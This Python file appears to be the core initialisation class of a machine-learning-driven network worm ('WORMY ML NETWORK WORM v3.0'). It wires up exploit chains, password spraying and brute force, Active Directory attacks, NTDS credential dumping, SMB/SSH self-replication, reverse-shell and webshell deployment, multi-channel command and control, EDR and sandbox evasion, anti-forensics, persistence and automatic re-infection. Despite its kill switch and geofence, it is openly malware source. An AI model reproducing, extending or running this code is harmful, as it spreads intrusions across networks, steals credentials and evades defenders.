import os
import sys
import threading
from datetime import datetime, timedelta

from .config_profiles import CONFIG_PROFILES
from .module_imports import (
    ADAPTIVE_CYCLE_AVAILABLE,
    ADAPTIVE_EXPLOIT_AVAILABLE,
    ASYNC_EXPLOIT_AVAILABLE,
    AUDIT_REPORT_AVAILABLE,
    BRUTE_FORCE_AVAILABLE,
    C2_AVAILABLE,
    CLI_MONITOR_AVAILABLE,
    CLOUD_C2_AVAILABLE,
    CONTEXTUAL_BANDIT_AVAILABLE,
    DCOM_LATERAL_AVAILABLE,
    DIRECT_SYSCALLS_AVAILABLE,
    DISTRIBUTED_REDUNDANCY_AVAILABLE,
    DORMANT_CELLS_AVAILABLE,
    EVASION_MODEL_AVAILABLE,
    EXPLOIT_ENGINE_AVAILABLE,
    FUZZING_ENGINE_AVAILABLE,
    HOST_MONITOR_AVAILABLE,
    ICMP_TUNNEL_AVAILABLE,
    INFECTION_ENGINE_AVAILABLE,
    JA3_SPOOF_AVAILABLE,
    KNOWLEDGE_GRAPH_AVAILABLE,
    LATERAL_MOVEMENT_AVAILABLE,
    LOCAL_PERSISTENCE_AVAILABLE,
    MITRE_MAPPER_AVAILABLE,
    MULTI_OPERATOR_AVAILABLE,
    PAYLOAD_DEPLOYER_AVAILABLE,
    PAYLOAD_MANAGER_AVAILABLE,
    PFS_CRYPTO_AVAILABLE,
    PLUGIN_SYSTEM_AVAILABLE,
    POLYMORPHIC_AVAILABLE,
    PREDICTIVE_RECON_AVAILABLE,
    PRO_SCANNER_AVAILABLE,
    REMOTE_PERSISTENCE_AVAILABLE,
    SELF_COPY_AVAILABLE,
    SEMANTIC_POLYMORPHISM_AVAILABLE,
    SLEEP_OBFUSCATOR_AVAILABLE,
    SWARM_AVAILABLE,
    TRAFFIC_MIMICRY_AVAILABLE,
    VSS_NTDS_AVAILABLE,
    AdaptiveCycle,
    AdaptiveExploitSelector,
    AdvancedPersistence,
    AsyncExploitDispatcher,
    AuditReportGenerator,
    BayesianNetworkAnalyzer,
    BruteForceEngine,
    CLIMonitor,
    CloudC2Manager,
    Config,
    ContextualBandit,
    DCOMLateral,
    Dict,
    DirectSyscalls,
    DistributedRedundancy,
    DormantCellManager,
    EvasionModel,
    ExploitChain,
    FuzzingEngine,
    HostClassifier,
    HostMonitor,
    HostState,
    ICMPTunnel,
    InfectionEngine,
    IntelligentScanner,
    JA3Spoofer,
    LateralMovementEngine,
    List,
    MITREMapper,
    MultiOperatorServer,
    MultiProtocolC2,
    NetworkKnowledgeGraph,
    PasswordGenerator,
    PayloadDeployer,
    PayloadManager,
    PersistenceEngine,
    PersistenceManager,
    PFSCrypto,
    PluginManager,
    PolymorphicEngine,
    PredictiveScanner,
    ProfessionalScanner,
    PropagationAgent,
    RealWorldPropagationAgent,
    SelfCopyTransfer,
    ServiceDetector,
    SemanticPolymorphicEngine,
    SleepObfuscator,
    SwarmAgent,
    SwarmCoordinator,
    TrafficMimicryEngine,
    VSSNTDSExtractor,
    VulnerabilityScanner,
    WormActivityBridge,
    WORM_FILE_PATH,
    logger,
)
from .standalone import get_local_ip


class WormCoreBase:
    def __init__(
        self,
        config_file: str = None,
        use_cli_monitor: bool = True,
        profile: str = None,
        dry_run: bool = False,
        interactive: bool = False,
    ):
        self.dry_run = dry_run
        self.interactive = interactive
        self._lock = threading.Lock()
        if dry_run:
            logger.info("[DRY RUN] No real exploits will be executed")

        self.config = Config(config_file) if config_file else Config()

        if profile and profile in CONFIG_PROFILES:
            self._apply_profile(profile)

        try:
            local_ip = get_local_ip()
            if local_ip and local_ip != "127.0.0.1":
                parts = local_ip.split(".")
                local_subnet = f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
                if local_subnet not in self.config.safety.allowed_networks:
                    self.config.safety.allowed_networks.append(local_subnet)
        except Exception:
            pass

        if not self.config.validate():
            logger.critical("Invalid configuration")
            sys.exit(1)

        self.cli_monitor = None
        self.activity_bridge = None
        if use_cli_monitor and CLI_MONITOR_AVAILABLE and not dry_run:
            self.cli_monitor = CLIMonitor()
            self.activity_bridge = WormActivityBridge(self.cli_monitor)
            self.cli_monitor.start_background(refresh_interval=1.5)

        logger.info("=" * 60)
        logger.info("WORMY ML NETWORK WORM v3.0")
        logger.info("=" * 60)
        if profile:
            logger.info(f"Profile: {profile}")
        if dry_run:
            logger.info("Mode: DRY RUN (simulation only)")
        if interactive:
            logger.info("Mode: INTERACTIVE CLI")
        logger.info(f"Target Ranges: {self.config.network.target_ranges}")
        logger.info("=" * 60)

        self.pro_scanner = None
        if PRO_SCANNER_AVAILABLE:
            self.pro_scanner = ProfessionalScanner(
                max_concurrency=self.config.network.max_threads,
                timeout=self.config.network.scan_timeout,
            )
            logger.info("Professional Scanner: enabled")
        self.scanner = IntelligentScanner(self.config, use_ml=True)

        self.knowledge_graph = None
        if KNOWLEDGE_GRAPH_AVAILABLE:
            self.knowledge_graph = NetworkKnowledgeGraph()
            logger.info("Knowledge Graph: enabled")

        from exploits.exploit_manager import ExploitManager

        self.exploit_manager = ExploitManager(self.config)

        self.cred_manager = self.exploit_manager.cred_manager

        self.brute_force_engine = None
        if BRUTE_FORCE_AVAILABLE and self.cred_manager:
            self.brute_force_engine = BruteForceEngine(
                credential_manager=self.cred_manager,
                password_generator=self.exploit_manager.password_generator,
            )
            logger.info("Brute Force Engine: enabled")

        self.vuln_scanner = None
        self.exploit_chain = None
        if EXPLOIT_ENGINE_AVAILABLE:
            self.vuln_scanner = VulnerabilityScanner()
            self.exploit_chain = ExploitChain(self.vuln_scanner)
            logger.info("Vulnerability Scanner + Exploit Chain: enabled")

        self.async_dispatcher = None
        if ASYNC_EXPLOIT_AVAILABLE:
            self.async_dispatcher = AsyncExploitDispatcher(
                exploit_manager=self.exploit_manager,
                credential_manager=self.cred_manager,
                max_concurrency=5,
                target_timeout=30.0,
            )
            logger.info("Async Exploit Dispatcher: enabled")

        self.lateral_movement = None
        if LATERAL_MOVEMENT_AVAILABLE:
            self.lateral_movement = LateralMovementEngine(self.cred_manager)
            logger.info("Lateral Movement: enabled")

        self.polymorphic_engine = None
        if POLYMORPHIC_AVAILABLE:
            self.polymorphic_engine = PolymorphicEngine(mutation_level=2)
            logger.info("Polymorphic Engine: enabled (level 2)")

        self.c2_server = None
        if C2_AVAILABLE:
            try:
                self.c2_server = MultiProtocolC2(self.config)
                logger.info("C2 Server: enabled")
            except Exception as e:
                logger.warning(f"C2 Server failed to initialize: {e}")

        self.host_monitor = None
        if HOST_MONITOR_AVAILABLE:
            self.host_monitor = HostMonitor(polymorphic_engine=self.polymorphic_engine)
            logger.info("Host Monitor: enabled (payload mutation per host)")

        self.web_dashboard = None
        try:
            from monitoring.web_dashboard import WebDashboard

            self.web_dashboard = WebDashboard(worm_core=self, host="0.0.0.0", port=5000)
            logger.info("Web Dashboard: enabled (http://0.0.0.0:5000)")
        except Exception as e:
            logger.warning(f"Web Dashboard failed to initialize: {e}")

        self.armitage_dashboard = None
        try:
            from monitoring.armitage_dashboard import ArmitageDashboard
            from training.realistic_training import RealisticTrainer

            trainer = None
            try:
                trainer = RealisticTrainer(self.config.ml.rl_agent_path.replace(".h5", ""))
            except Exception:
                pass
            self.armitage_dashboard = ArmitageDashboard(
                worm_core=self, trainer=trainer, host="0.0.0.0", port=5001
            )
            logger.info("Armitage Dashboard: enabled (http://0.0.0.0:5001)")
        except Exception as e:
            logger.warning(f"Armitage Dashboard failed to initialize: {e}")

        from evasion.anti_forensics import AntiForensics
        from evasion.edr_bypass import EDRBypass
        from evasion.ids_detector import IDSDetector
        from evasion.ids_evasion import IDSEvasionEngine
        from evasion.memory_execution import MemoryExecution
        from evasion.stealth_engine import StealthEngine

        self.ids_detector = IDSDetector(self.config)
        self.stealth_engine = StealthEngine(self.config)
        self.ids_evasion = IDSEvasionEngine(self.config)
        self.anti_forensics = AntiForensics()
        self.edr_bypass = EDRBypass()
        self.memory_execution = MemoryExecution()

        self.enterprise_evasion = None
        try:
            from evasion.enterprise_evasion import EnterpriseEvasionEngine

            self.enterprise_evasion = EnterpriseEvasionEngine()
            evasion_results = self.enterprise_evasion.apply_all(bail_on_sandbox=True)
            active = [k for k, v in evasion_results.items() if v is True]
            logger.info(
                f"Enterprise Evasion v2: {active if active else 'platform-limited (non-Windows)'}"
            )
        except Exception as e:
            logger.warning(f"Enterprise Evasion v2 failed to init: {e}")

        self.enterprise_password_engine = None
        try:
            from exploits.enterprise_password_engine import EnterprisePasswordEngine

            self.enterprise_password_engine = EnterprisePasswordEngine(
                max_workers=20, lockout_threshold=5
            )
            logger.info(
                "Enterprise Password Engine: enabled (spray + brute + stuffing + mutations)"
            )
        except Exception as e:
            logger.warning(f"Enterprise Password Engine failed: {e}")

        self.enterprise_scanner = None
        try:
            from scanner.enterprise_scanner import EnterpriseScanner

            self.enterprise_scanner = EnterpriseScanner(
                max_workers=min(100, self.config.network.max_threads * 2),
                timeout=self.config.network.scan_timeout,
            )
            logger.info("Enterprise Scanner v2: enabled (TCP-probe, banner-grab, asset-classify)")
        except Exception as e:
            logger.warning(f"Enterprise Scanner v2 failed: {e}")

        self.ad_attacker = None
        try:
            from exploits.active_directory import ActiveDirectoryAttacker

            self.ad_attacker = ActiveDirectoryAttacker()
            logger.info("Active Directory Attacker: enabled (LDAP enum, AS-REP, Kerberoast)")
        except Exception as e:
            logger.warning(f"AD Attacker failed: {e}")

        self.resilient_c2 = None
        try:
            from c2.resilient_c2 import ResilientC2Engine

            self.resilient_c2 = ResilientC2Engine(config=self.config)
            self.resilient_c2.start(start_p2p=True)
            logger.info("Resilient C2 v2: enabled (DoH + DomainFronting + P2P + CommandQueue)")
        except Exception as e:
            logger.warning(f"Resilient C2 v2 failed: {e}")

        self.advanced_polymorphic = None
        try:
            from evasion.advanced_polymorphic import AdvancedPolymorphicEngine

            self.advanced_polymorphic = AdvancedPolymorphicEngine(mutation_level=3)
            logger.info(
                "Advanced Polymorphic v2: enabled (AST-metamorphic, semantic NOPs, net-fingerprint)"
            )
        except Exception as e:
            logger.warning(f"Advanced Polymorphic v2 failed: {e}")

        self.wave_propagation = None
        try:
            from core.wave_propagation import WavePropagationEngine

            self.wave_propagation = WavePropagationEngine(
                max_waves=3,
                max_workers=min(20, self.config.network.max_threads),
            )
            logger.info(
                "Wave Propagation v2: enabled (pivot-scan, SMB/SSH self-copy, propagation-graph)"
            )
        except Exception as e:
            logger.warning(f"Wave Propagation v2 failed: {e}")

        self.agent_controller = None
        try:
            from core.agent_controller import AgentController

            self.agent_controller = AgentController(
                heartbeat_interval=60,
                stale_threshold=600,
                max_workers=20,
            )

            def _on_dead(agent_session):
                target = {
                    "ip": agent_session.ip,
                    "open_ports": [22, 445],
                    "asset_value": agent_session.asset_value,
                }
                logger.warning(f"Agent {agent_session.ip} dead -- queuing re-infection")
                self.exploit_queue.put(target) if hasattr(self, "exploit_queue") else None

            self.agent_controller.start_heartbeat_monitor(on_dead_agent=_on_dead)
            logger.info(
                "Agent Controller v2: enabled (heartbeat, SSH pool, task queue, intel harvest)"
            )
        except Exception as e:
            logger.warning(f"Agent Controller v2 failed: {e}")

        self.advanced_self_healing = None
        try:
            from core.advanced_self_healing import AdvancedSelfHealingEngine

            self.advanced_self_healing = AdvancedSelfHealingEngine(
                config=self.config,
                payload_path=WORM_FILE_PATH,
            )
            self.advanced_self_healing.start(check_interval=120, launch_guardian=False)
            logger.info(
                "Advanced Self-Healing v2: enabled (integrity-check, re-persist, watchdog, cleanup)"
            )
        except Exception as e:
            logger.warning(f"Advanced Self-Healing v2 failed: {e}")

        self.adaptive_cycle = None
        if ADAPTIVE_CYCLE_AVAILABLE:
            try:
                local_ip = get_local_ip()
                self.adaptive_cycle = AdaptiveCycle(
                    host_ip=local_ip,
                    host_id="wormy_main",
                )
                logger.info("Adaptive Cycle: enabled (APT-Level)")
            except Exception as e:
                logger.warning(f"Adaptive Cycle failed to initialize: {e}")

        self.predictive_scanner = None
        if PREDICTIVE_RECON_AVAILABLE:
            self.predictive_scanner = PredictiveScanner()
            logger.info("Predictive Reconnaissance: enabled")

        self.adaptive_exploit_selector = None
        if ADAPTIVE_EXPLOIT_AVAILABLE:
            self.adaptive_exploit_selector = AdaptiveExploitSelector()
            logger.info("Adaptive Exploit Selector: enabled (Thompson Sampling)")

        self.distributed_redundancy = None
        if DISTRIBUTED_REDUNDANCY_AVAILABLE:
            try:
                local_ip = get_local_ip()
                self.distributed_redundancy = DistributedRedundancy(
                    host_ip=local_ip, host_id="wormy_main"
                )
                logger.info("Distributed Redundancy: enabled (P2P healing mesh)")
            except Exception as e:
                logger.warning(f"Distributed Redundancy failed: {e}")

        self.traffic_mimicry = None
        if TRAFFIC_MIMICRY_AVAILABLE:
            self.traffic_mimicry = TrafficMimicryEngine()
            logger.info("Traffic Mimicry: enabled (protocol tunneling)")

        self.semantic_polymorphism = None
        if SEMANTIC_POLYMORPHISM_AVAILABLE:
            self.semantic_polymorphism = SemanticPolymorphicEngine()
            logger.info("Semantic Polymorphism: enabled (AST manipulation)")

        self.dormant_cells = None
        if DORMANT_CELLS_AVAILABLE:
            self.dormant_cells = DormantCellManager()
            logger.info("Dormant Cells: enabled (staged loading)")

        self.self_copy = None
        if SELF_COPY_AVAILABLE:
            self.self_copy = SelfCopyTransfer()
            logger.info("Self-Copy Transfer: enabled (SSH/SMB worm replication)")

        self.payload_deployer = None
        if PAYLOAD_DEPLOYER_AVAILABLE:
            self.payload_deployer = PayloadDeployer()
            logger.info("Payload Deployer: enabled (reverse shell, beacon, webshell)")

        self.remote_persistence = None
        if REMOTE_PERSISTENCE_AVAILABLE:
            self.remote_persistence = PersistenceEngine()
            logger.info("Remote Persistence Engine: enabled (cron, systemd, registry, SSH keys)")

        self.infection_engine = None
        if INFECTION_ENGINE_AVAILABLE:
            self.infection_engine = InfectionEngine()
            logger.info("Infection Engine: enabled (7-vector infection, backdoors, persistence)")

        self.cloud_c2 = None
        if CLOUD_C2_AVAILABLE:
            try:
                self.cloud_c2 = CloudC2Manager()
                logger.info("Cloud C2 Manager: enabled (Telegram/Slack/Sheets)")
            except Exception as e:
                logger.warning(f"Cloud C2 Manager failed: {e}")

        self.dcom_lateral = None
        if DCOM_LATERAL_AVAILABLE:
            try:
                self.dcom_lateral = DCOMLateral()
                logger.info("DCOM Lateral Movement: enabled")
            except Exception as e:
                logger.warning(f"DCOM Lateral Movement failed: {e}")

        self.vss_ntds = None
        if VSS_NTDS_AVAILABLE:
            try:
                self.vss_ntds = VSSNTDSExtractor(output_dir="saved/ntds_dumps")
                logger.info("VSS NTDS Extractor: enabled")
            except Exception as e:
                logger.warning(f"VSS NTDS Extractor failed: {e}")

        self.ja3_spoofer = None
        if JA3_SPOOF_AVAILABLE:
            try:
                self.ja3_spoofer = JA3Spoofer(profile="chrome_120")
                logger.info("JA3 Spoofer: enabled (Chrome 120 fingerprint)")
            except Exception as e:
                logger.warning(f"JA3 Spoofer failed: {e}")

        self.icmp_tunnel = None
        if ICMP_TUNNEL_AVAILABLE:
            try:
                local_ip = get_local_ip()
                self.icmp_tunnel = ICMPTunnel(c2_ip=local_ip)
                logger.info("ICMP Tunnel: enabled")
            except Exception as e:
                logger.warning(f"ICMP Tunnel failed: {e}")

        self.direct_syscalls = None
        if DIRECT_SYSCALLS_AVAILABLE:
            try:
                self.direct_syscalls = DirectSyscalls()
                logger.info("Direct Syscalls: enabled (NT syscall invocation)")
            except Exception as e:
                logger.warning(f"Direct Syscalls failed: {e}")

        self.sleep_obfuscator = None
        if SLEEP_OBFUSCATOR_AVAILABLE:
            try:
                self.sleep_obfuscator = SleepObfuscator()
                logger.info("Sleep Obfuscator: enabled (Ekko-style sleep masking)")
            except Exception as e:
                logger.warning(f"Sleep Obfuscator failed: {e}")

        self.multi_operator = None
        if MULTI_OPERATOR_AVAILABLE:
            try:
                self.multi_operator = MultiOperatorServer(
                    host="0.0.0.0",
                    port=8444,
                    jwt_secret=os.getenv("WORMY_JWT_SECRET", "wormy_jwt_secret_change_me"),
                    db_path="saved/operators.db",
                )
                logger.info("Multi-Operator Server: enabled (port 8444)")
            except Exception as e:
                logger.warning(f"Multi-Operator Server failed: {e}")

        self.mitre_mapper = None
        if MITRE_MAPPER_AVAILABLE:
            try:
                self.mitre_mapper = MITREMapper(operation_name="Wormy Operation")
                logger.info("MITRE ATT&CK Mapper: enabled")
            except Exception as e:
                logger.warning(f"MITRE ATT&CK Mapper failed: {e}")

        self.plugin_manager = None
        if PLUGIN_SYSTEM_AVAILABLE:
            try:
                self.plugin_manager = PluginManager()
                discovered = self.plugin_manager.discover_plugins()
                logger.info(f"Plugin System: enabled ({len(discovered)} plugins discovered)")
            except Exception as e:
                logger.warning(f"Plugin System failed: {e}")

        self.local_persistence = None
        self.advanced_persistence = None
        if LOCAL_PERSISTENCE_AVAILABLE:
            try:
                self.local_persistence = PersistenceManager()
                self.advanced_persistence = AdvancedPersistence()
                logger.info("Local Persistence: enabled (run key, cron, systemd, etc.)")
            except Exception as e:
                logger.warning(f"Local Persistence failed: {e}")

        self.host_classifier = None
        try:
            classifier_path = os.path.join(
                os.path.dirname(WORM_FILE_PATH),
                "ml_models",
                "saved",
                "host_classifier.pkl",
            )
            self.host_classifier = HostClassifier(model_path=classifier_path)
            logger.info("Host Classifier: enabled (Random Forest, 7 classes)")
        except Exception as e:
            logger.warning(f"Host Classifier failed: {e}")

        self.evasion_model = None
        if EVASION_MODEL_AVAILABLE:
            try:
                ev_model_path = os.path.join(
                    os.path.dirname(WORM_FILE_PATH),
                    "ml_models",
                    "saved",
                    "evasion_model.pkl",
                )
                self.evasion_model = EvasionModel(model_path=ev_model_path)
                logger.info("Evasion Model: enabled (detection probability prediction)")
            except Exception as e:
                logger.warning(f"Evasion Model failed: {e}")

        self.contextual_bandit = None
        if CONTEXTUAL_BANDIT_AVAILABLE:
            try:
                self.contextual_bandit = ContextualBandit(alpha=0.3)
                logger.info("Contextual Bandit: enabled (LinUCB credential selection)")
            except Exception as e:
                logger.warning(f"Contextual Bandit failed: {e}")

        self.swarm_coordinator = None
        self.swarm_agent = None
        if SWARM_AVAILABLE:
            try:
                self.swarm_coordinator = SwarmCoordinator()
                self.swarm_agent = SwarmAgent(role="coordinator")
                self.swarm_coordinator.register_agent(self.swarm_agent)
                logger.info("Swarm Coordinator: enabled (multi-agent intelligence)")
            except Exception as e:
                logger.warning(f"Swarm Coordinator failed: {e}")

        self.payload_manager = None
        if PAYLOAD_MANAGER_AVAILABLE:
            try:
                c2_host = self.config.c2.c2_server
                c2_port = self.config.c2.c2_port
                self.payload_manager = PayloadManager(c2_server=c2_host, c2_port=c2_port)
                logger.info("Payload Manager: enabled (specialized payload deployment)")
            except Exception as e:
                logger.warning(f"Payload Manager failed: {e}")

        self.fuzzing_engine = None
        if FUZZING_ENGINE_AVAILABLE:
            try:
                self.fuzzing_engine = FuzzingEngine(timeout=5.0)
                logger.info("Fuzzing Engine: enabled (protocol fuzzing)")
            except Exception as e:
                logger.warning(f"Fuzzing Engine failed: {e}")

        self.pfs_crypto = None
        if PFS_CRYPTO_AVAILABLE:
            try:
                self.pfs_crypto = PFSCrypto()
                logger.info("PFS Crypto: enabled (Perfect Forward Secrecy)")
            except Exception as e:
                logger.warning(f"PFS Crypto failed: {e}")

        state_size = 300
        action_size = 50
        self.rl_agent = PropagationAgent(state_size, action_size, use_dqn=True)

        model_loaded = False
        if self.config.ml.use_pretrained and os.path.exists(self.config.ml.rl_agent_path):
            try:
                self.rl_agent.load(self.config.ml.rl_agent_path)
                logger.info("Pretrained RL model loaded")
                model_loaded = True
            except Exception as e:
                logger.warning(f"Failed to load pretrained model: {e}")

        if not model_loaded and self.config.ml.use_pretrained:
            try:
                from training.realistic_training import (
                    RealisticTrainer,
                    auto_train_if_needed,
                )

                save_dir = self.config.ml.rl_agent_path
                if save_dir.endswith((".h5", ".zip", ".pt")):
                    save_dir = os.path.dirname(save_dir)
                if not save_dir:
                    save_dir = "saved/rl_agent"
                trainer = RealisticTrainer(save_dir)

                if trainer.needs_training():
                    logger.info(
                        "No pre-trained model found. Starting auto-training on realistic scenarios..."
                    )
                    logger.info("Scenarios: small_office -> enterprise -> datacenter -> cloud -> iot")
                    logger.info("This may take a few minutes...")
                    auto_train_if_needed(save_dir)

                if os.path.exists(trainer.best_model_path):
                    self.rl_agent.load(trainer.best_model_path)
                    self.rl_agent.epsilon = 0.1
                    logger.info(
                        f"Auto-trained model loaded (best reward: {trainer.best_reward:.2f})"
                    )
                    model_loaded = True
            except Exception as e:
                logger.warning(f"Auto-training failed: {e}")
                logger.info("Continuing with random weights (agent will learn during operation)")

        self.real_world_agent = RealWorldPropagationAgent(self.rl_agent, action_size)

        self.use_thompson_sampling = (
            self.config.ml.use_thompson_sampling
            if hasattr(self.config.ml, "use_thompson_sampling")
            else False
        )
        if self.use_thompson_sampling and hasattr(self.rl_agent, "init_ensemble"):
            try:
                self.rl_agent.init_ensemble(n_networks=5)
                logger.info("Thompson Sampling: enabled (5-network bootstrapped ensemble)")
            except Exception as e:
                logger.warning(f"Thompson Sampling ensemble init failed: {e}")
                self.use_thompson_sampling = False

        self.audit_generator = None
        if AUDIT_REPORT_AVAILABLE:
            self.audit_generator = AuditReportGenerator()

        self.infected_hosts: set = set()
        self.failed_targets: set = set()
        self.scan_results: list = []
        self.start_time = None
        self.kill_switch_activated = False
        self.running = False
        self._detection_events: list = []
        self._data_lock = threading.RLock()

        self.stats = {
            "scans": 0,
            "infections": 0,
            "failed_exploits": 0,
            "total_hosts_discovered": 0,
            "lateral_movements": 0,
            "lateral_success": 0,
            "credentials_discovered": 0,
            "polymorphic_mutations": 0,
            "vulnerabilities_found": 0,
            "exploit_chains_built": 0,
            "brute_force_attempts": 0,
            "brute_force_successes": 0,
            "c2_beacons": 0,
            "start_time": None,
            "end_time": None,
        }

    def _apply_profile(self, profile: str):
        overrides = CONFIG_PROFILES.get(profile, {})
        if not overrides:
            return

        for key, value in overrides.items():
            if hasattr(self.config.propagation, key):
                setattr(self.config.propagation, key, value)
            elif hasattr(self.config.evasion, key):
                setattr(self.config.evasion, key, value)
            elif hasattr(self.config.safety, key):
                setattr(self.config.safety, key, value)
            elif hasattr(self.config.ml, key):
                setattr(self.config.ml, key, value)

        logger.info(f"Applied profile: {profile}")

    def _safe_add_infected(self, ip: str):
        with self._data_lock:
            self.infected_hosts.add(ip)

    def _safe_add_failed(self, ip: str):
        with self._data_lock:
            self.failed_targets.add(ip)

    def _safe_is_infected(self, ip: str) -> bool:
        with self._data_lock:
            return ip in self.infected_hosts

    def _safe_infection_count(self) -> int:
        with self._data_lock:
            return len(self.infected_hosts)

    def _safe_scan_results_copy(self) -> List[Dict]:
        with self._data_lock:
            return list(self.scan_results)

    def check_safety_constraints(self) -> bool:
        if self.kill_switch_activated:
            logger.log_kill_switch("Manual activation")
            return False

        if len(self.infected_hosts) >= self.config.propagation.max_infections:
            logger.warning(f"Max infections reached: {self.config.propagation.max_infections}")
            return False

        if self.start_time and self.config.safety.max_runtime_hours > 0:
            elapsed = datetime.now() - self.start_time
            max_runtime = timedelta(hours=self.config.safety.max_runtime_hours)
            if elapsed > max_runtime:
                logger.warning(f"Max runtime exceeded: {self.config.safety.max_runtime_hours}h")
                return False

        if self.start_time and self.config.safety.auto_destruct_time > 0:
            elapsed = datetime.now() - self.start_time
            destruct_time = timedelta(hours=self.config.safety.auto_destruct_time)
            if elapsed > destruct_time:
                logger.critical(f"Auto-destruct timer: {self.config.safety.auto_destruct_time}h")
                self.self_destruct()
                return False

        if self.config.safety.geofence_enabled:
            from utils.network_utils import get_local_ip, is_ip_in_range

            local_ip = get_local_ip()
            in_allowed = any(
                is_ip_in_range(local_ip, net) for net in self.config.safety.allowed_networks
            )
            if not in_allowed:
                logger.critical(f"Geofence violation: {local_ip}")
                return False

        return True

    def activate_kill_switch(self, code: str):
        if code == self.config.safety.kill_switch_code:
            logger.log_kill_switch("Correct code")
            self.kill_switch_activated = True
            self.shutdown()
        else:
            logger.warning("Invalid kill switch code")

    def self_destruct(self):
        logger.critical("SELF-DESTRUCT ACTIVATED")
        logger.info("Cleaning up...")
        self.shutdown()

    def shutdown(self):
        logger.info("Shutting down")
        self.running = False
        self.print_final_report()

        if self.config.ml.online_learning:
            try:
                save_path = self.config.ml.rl_agent_path
                if os.path.isdir(save_path):
                    save_path = os.path.join(save_path, "rl_agent.h5")
                self.rl_agent.save(save_path)
                logger.info("RL agent saved")
            except Exception as e:
                logger.warning(f"Failed to save RL agent: {e}")

        if self.c2_server:
            try:
                self.c2_server.stop()
            except Exception as e:
                logger.warning(f"C2 server stop error: {e}")

        if self.multi_operator:
            try:
                self.multi_operator.stop()
            except Exception as e:
                logger.warning(f"Multi-Operator stop error: {e}")

        if self.icmp_tunnel:
            try:
                self.icmp_tunnel.stop()
            except Exception as e:
                logger.warning(f"ICMP tunnel stop error: {e}")

        if self.mitre_mapper:
            try:
                mitre_path = self.mitre_mapper.save_report(path="reports/mitre_attack.json")
                logger.info(f"MITRE ATT&CK report saved: {mitre_path}")
            except Exception as e:
                logger.warning(f"MITRE report save error: {e}")

        logger.info("Shutdown complete")
        sys.exit(0)
